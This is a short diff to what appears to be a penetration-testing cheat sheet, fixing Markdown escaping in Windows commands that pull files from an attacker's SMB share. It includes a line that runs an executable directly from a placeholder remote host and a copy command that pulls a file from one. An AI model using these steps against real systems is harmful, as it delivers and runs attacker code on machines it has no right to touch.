@@ -92,9 +92,9 @@ or check on Windows
 > net view \\\[attack machine ip address\]
 
 Copy file 
-`copy \\\[your ip address\]\Sharepath .`
+`copy \\[your ip address]\Sharepath .`
 
 Or execute the file directly from SMB
-`\\\[your ip address\]\file.exe`
+`\\[your ip address]\file.exe`
 
 
